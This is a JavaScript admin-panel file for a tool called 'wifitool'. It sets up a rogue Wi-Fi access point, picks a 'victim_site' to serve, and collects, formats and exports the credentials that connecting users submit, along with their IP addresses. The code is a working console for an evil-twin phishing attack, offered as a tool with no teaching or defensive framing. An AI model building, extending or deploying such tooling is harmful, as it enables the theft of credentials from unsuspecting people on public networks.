// wifitool/web/admin/admin.js

(function () {
  'use strict';

  // Helpers
  function el(id) { return document.getElementById(id); }
  function setText(id, txt) { const e=el(id); if(e) e.textContent = txt; }

  // Generic fetch wrapper
  async function apiFetch(path, opts = {}) {
    const resp = await fetch(path, opts);
    if (!resp.ok) {
      const txt = await resp.text().catch(()=>String(resp.status));
      // Keep alerts for API errors
      alert(`API Error: ${txt}`);
      throw new Error(`HTTP ${resp.status}: ${txt}`);
    }
    try {
      return await resp.json();
    } catch {
      return null;
    }
  }

  // --- MODIFIED: This function now checks the AP status ---
  async function loadStatus() {
    try {
      // Call the new endpoint
      const status = await apiFetch('/admin/api/ap_status'); 
      if (status.status === "Running") {
        setText('serverStatus', `Running - port ${status.port || '?'}`);
      } else {
        setText('serverStatus', `Disabled - port ${status.port || '--'}`);
      }
    } catch {
      setText('serverStatus', 'Unreachable');
    }
  }

  // Adapters list
  async function loadAdapters() {
    const sel = el('adapterSelect');
    sel.innerHTML = '';
    try {
      const data = await apiFetch('/admin/api/adapters');
      const adapters = (data && data.adapters) || [];
      if (adapters.length === 0) {
        sel.innerHTML = '<option value="">(none)</option>';
        return;
      }
      adapters.forEach(a => {
        const o = document.createElement('option');
        o.value = a; o.textContent = a;
        sel.appendChild(o);
      });
    } catch {
      sel.innerHTML = '<option value="">(detect failed)</option>';
    }
  }

  // Sites list
  async function loadSites() {
    const sel = el('siteSelect');
    sel.innerHTML = '';
    try {
      const data = await apiFetch('/admin/api/sites');
      const sites = (data && data.sites) || [];
      if (sites.length === 0) {
        sel.innerHTML = '<option value="">(none)</option>';
        return;
      }
      sites.forEach(s => {
        const o = document.createElement('option');
        o.value = s; o.textContent = s;
        sel.appendChild(o);
      });
    } catch {
      sel.innerHTML = '<option value="">(no sites)</option>';
    }
  }

  // Save adapter to config
  async function setAdapter() {
    const val = el('adapterSelect').value;
    if (!val) return alert('Select an adapter first.'); // Keep user error alert
    try {
      await apiFetch('/admin/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wifi_interface: val })
      });
      setText('selectedAdapter', val);
      // alert('Adapter saved.'); // <-- REMOVED
    } catch (e) {
      alert('Failed to save adapter: ' + e);
    }
  }

  // Apply site
  async function applySite() {
    const sel = el('siteSelect').value;
    const custom = el('customSite').value.trim();
    const site = custom || sel;
    if (!site) return alert('Choose or enter a site folder.'); // Keep user error alert
    try {
      await apiFetch('/admin/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ victim_site: site })
      });
      setText('selectedSite', site);
      // alert('Site applied.'); // <-- REMOVED
    } catch (e) {
      alert('Failed to apply site: ' + e);
    }
  }

  // Apply AP settings
  async function applyAP() {
    const ssid = el('ssidInput').value.trim();
    const channel = el('channelInput').value.trim();
    const wpa2 = el('wpaCheck').checked;
    const pass = el('wpaPass').value.trim();
    if (!ssid) return alert('Enter SSID.'); // Keep user error alert
    if (wpa2 && pass.length < 8) return alert('WPA2 passphrase must be >= 8 chars.'); // Keep user error alert
    try {
      await apiFetch('/admin/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ssid, channel: channel || 6, wpa2, wpa_passphrase: pass })
      });
      // alert('AP settings saved.'); // <-- REMOVED
    } catch (e) {
      alert('Failed to save AP settings: ' + e);
    }
  }

  // Generate runtime files
  async function generateRuntime() {
    try {
      await apiFetch('/admin/api/generate', { method: 'POST' });
      // alert('Runtime templates generated.'); // <-- REMOVED
    } catch (e) {
      alert('Failed to generate runtime files: ' + e);
    }
  }

  // Start/stop AP (uses core/network.py now)
  async function startAP() {
    try {
      await apiFetch('/admin/api/start_ap', { method: 'POST' });
      await loadStatus(); // --- MODIFIED: Refresh status
    } catch (e) {
      alert('Failed to start AP: ' + e);
    }
  }

  async function stopAP() {
    try {
      await apiFetch('/admin/api/stop_ap', { method: 'POST' });
      await loadStatus(); // --- MODIFIED: Refresh status
    } catch (e) {
      alert('Failed to stop AP: ' + e);
    }
  }

  // Load and display submissions
  async function loadSubmissions() {
    const viewer = el('subsViewer');
    viewer.textContent = 'Loading...';
    try {
      // Use POST as defined in portal.py
      const data = await apiFetch('/admin/api/submissions', { method: 'POST' });
      const records = (data && data.records) || [];
      if (records.length === 0) {
        viewer.textContent = 'No submissions found.';
        return;
      }
      
      // --- MODIFICATION: Format the output ---
      const formattedEntries = records.map(recString => {
        // --- THIS IS THE FIX ---
        // The server is sending a list of *strings*, so we parse each one.
        const rec = JSON.parse(recString); 

        const lines = [];
        
        // Add meta info
        if (rec.meta) {
          lines.push(`Timestamp: ${rec.meta.ts || 'N/A'}`);
          lines.push(`Client IP: ${rec.meta.client_ip || 'N/A'}`);
        }

        // Add form info
        if (rec.form) {
          for (const key in rec.form) {
            if (Object.hasOwnProperty.call(rec.form, key)) {
              // Format the key: 'device_name' -> 'Device Name'
              const formattedKey = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
              lines.push(`${formattedKey}: ${rec.form[key]}`);
            }
          }
        }
        return lines.join('\n');
      });

      // Join each entry with a separator
      viewer.textContent = formattedEntries.join('\n\n--------------------------------\n\n');
      // --- END OF MODIFICATION ---

    } catch (e) {
      viewer.textContent = `Failed to load submissions: ${e}`;
    }
  }

  // Export viewer content to a file
  function exportSubmissions() {
    const content = el('subsViewer').textContent;
    if (!content || content.startsWith('No data') || content.startsWith('Failed') || content.startsWith('Loading')) {
      return alert('Load submissions first before exporting.');
    }
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `wifitool-submissions-${Date.now()}.txt`; // Changed to .txt
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  // Clear the viewer
  function clearViewer() {
    el('subsViewer').textContent = 'No data loaded. Click "Load credentials".';
  }

  // Fetch, format, and display recent logs
  async function loadLogs() {
    const viewer = el('eventLogViewer');
    if (!viewer) return;
    try {
      const data = await apiFetch('/admin/api/logs');
      const logs = (data && data.logs) || [];
      if (logs.length === 0) {
        viewer.textContent = 'No log entries.';
        return;
      }
      // Reverse to show newest first, join with newlines
      viewer.textContent = logs.reverse().join('\n');
    } catch (e) {
      // Don't alert, just show in the viewer
      viewer.textContent = `Failed to load logs: ${e}`;
    }
  }

  // Clear the log viewer
  function clearLogViewer() {
    el('eventLogViewer').textContent = '—';
  }

  // Wire buttons
  function wire() {
    el('btnDetect').addEventListener('click', loadAdapters);
    el('btnSetAdapter').addEventListener('click', setAdapter);
    el('btnSetSite').addEventListener('click', applySite);
    el('btnApplyAP').addEventListener('click', applyAP);
    el('btnGenerate').addEventListener('click', generateRuntime);
    el('btnSimStart').addEventListener('click', startAP);
    el('btnSimStop').addEventListener('click', stopAP);

    el('btnLoadSubs').addEventListener('click', loadSubmissions);
    el('btnExportSubs').addEventListener('click', exportSubmissions);
    el('btnClearView').addEventListener('click', clearViewer);
    
    el('btnClearLogs').addEventListener('click', clearLogViewer);
  }

  document.addEventListener('DOMContentLoaded', async () => {
    wire();
    await loadStatus(); // This will now call the new endpoint
    loadAdapters();
    loadSites();

    loadLogs(); // Load logs on page load
    setInterval(loadLogs, 5000); // Refresh logs every 5 seconds
  });
})();